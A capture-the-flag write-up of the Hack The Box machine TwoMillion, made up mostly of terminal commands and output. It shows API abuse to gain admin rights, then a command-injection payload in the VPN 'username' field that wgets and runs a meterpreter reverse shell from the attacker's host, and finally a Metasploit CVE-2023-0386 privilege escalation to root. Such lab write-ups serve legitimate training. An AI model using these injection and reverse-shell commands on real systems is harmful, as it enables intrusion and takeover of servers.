# Target
| Category          | Details                                                      |
|-------------------|--------------------------------------------------------------|
| 📝 **Name**       | [TwoMillion](https://app.hackthebox.com/machines/TwoMillion) |  
| 🏷 **Type**       | HTB Machine                                                  |
| 🖥 **OS**         | Linux                                                        |
| 🎯 **Difficulty** | Easy                                                         |
| 📁 **Tags**       | REST API, Metasploit, CVE-2023-0386                          |

# Scan
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
```

# Attack path
1. [Generate invitation code to register new user](#generate-invitation-code-to-register-new-user)
2. [Gain `admin` privileges using unsecured REST endpoint](#gain-admin-privileges-using-unsecured-rest-endpoint)
3. [Gain initial foothold using command injection in parameter of VPN generation REST endpoint](#gain-initial-foothold-using-command-injection-in-parameter-of-vpn-generation-rest-endpoint)
4. [Escalate to `root` user using (CVE-2023-0386)](#escalate-to-root-user-using-cve-2023-0386)

### Generate invitation code to register new user

#### Add `2million.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ echo "$TARGET 2million.htb" | sudo tee -a /etc/hosts
10.129.129.75 2million.htb
```

#### Discover REST API endpoint for generating invitation code
`http://2million.htb/api/v1/invite/verify` discovered in Burp.
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ feroxbuster --url http://2million.htb/api/v1/invite/ -w /usr/share/wordlists/dirb/big.txt -x php
<SNIP>
405      GET        0l        0w        0c http://2million.htb/api/v1/invite/generate
405      GET        0l        0w        0c http://2million.htb/api/v1/invite/verify
```

#### Generate invitation code using discovered endpoint and use to register and login
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ NAME=$RANDOM$RANDOM && \
CODE=$(curl -s -X POST http://2million.htb/api/v1/invite/generate | jq -r .data.code | base64 -d) && \
curl http://2million.htb/api/v1/user/register -d "code=$CODE&username=$NAME&email=$NAME@server.com&password=pass&password_confirmation=pass" && \
curl -c cookies.txt http://2million.htb/api/v1/user/login -d "email=$NAME@server.com&password=pass"
```

### Gain `admin` privileges using unsecured REST endpoint

#### Discover REST HTTP endpoints using `GET /api/v1`
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ curl -s -b cookies.txt http://2million.htb/api/v1 | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

#### Verify that user does not have `admin` role
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ curl -b cookies.txt http://2million.htb/api/v1/admin/auth
{"message":false}
```

#### Upgrade user to `admin` using unsecured `/api/v1/admin/settings/update` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ curl -s -b cookies.txt -X PUT http://2million.htb/api/v1/admin/settings/update -H 'Content-type: application/json' -d "{\"email\":\"$NAME@server.com\",\"is_admin\":1}" -o /dev/null
```

#### Verify that user does have `admin` role
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ curl -b cookies.txt http://2million.htb/api/v1/admin/auth
{"message":true}
```

### Gain initial foothold using command injection in parameter of VPN generation REST endpoint

#### Generate `linux/x64/meterpreter/reverse_tcp` reverse shell and expose is over HTTP
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f elf \
    -o shell && \
python3 -m http.server
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..
```

#### Start `msfconsole` with `exploit/multi/handler`
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x64/meterpreter/reverse_tcp; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.30:4444 
```

#### Inject reverse shell spawn command into `username` of `/api/v1/admin/vpn/generate` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB TwoMillion]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
curl -b cookies.txt http://2million.htb/api/v1/admin/vpn/generate -H "Content-type: application/json" -d "{\"username\":\";wget -P /tmp $LHOST:8000/shell;chmod +x /tmp/shell; /tmp/shell\"}"
```

#### Confirm foothold gained
```
[*] Sending stage (3090404 bytes) to 10.129.129.75
[*] Meterpreter session 1 opened (10.10.16.30:4444 -> 10.129.129.75:42850) at 2025-09-10 18:10:08 +0200

meterpreter > getuid
Server username: www-data
```

### Escalate to `root` user using ([CVE-2023-0386](https://nvd.nist.gov/vuln/detail/cve-2023-0386))

#### Use `exploit/linux/local/cve_2023_0386_overlayfs_priv_esc` module to exploit CVE-2023-0386
Vulnerability discovered by `post/multi/recon/local_exploit_suggester`.
```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/linux/local/cve_2023_0386_overlayfs_priv_esc
[*] Using configured payload linux/x64/meterpreter_reverse_tcp
msf exploit(linux/local/cve_2023_0386_overlayfs_priv_esc) > set SESSION 1
SESSION => 1
msf exploit(linux/local/cve_2023_0386_overlayfs_priv_esc) > set LHOST tun0
LHOST => tun0
msf exploit(linux/local/cve_2023_0386_overlayfs_priv_esc) > set LPORT 5555
LPORT => 5555
msf exploit(linux/local/cve_2023_0386_overlayfs_priv_esc) > run
[*] Started reverse TCP handler on 10.10.16.30:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Failed to open file: /proc/sys/kernel/unprivileged_userns_clone: core_channel_open: Operation failed: 1
[+] The target appears to be vulnerable. Linux kernel version found: 5.15.70
[*] Writing '/tmp/.DMo6ixaP/.GqceBxS' (1121480 bytes) ...
[*] Launching exploit...
[+] Deleted /tmp/.DMo6ixaP
[*] Meterpreter session 2 opened (10.10.16.30:5555 -> 10.129.129.75:41458) at 2025-09-10 18:12:01 +0200
meterpreter > getuid
Server username: root
```
      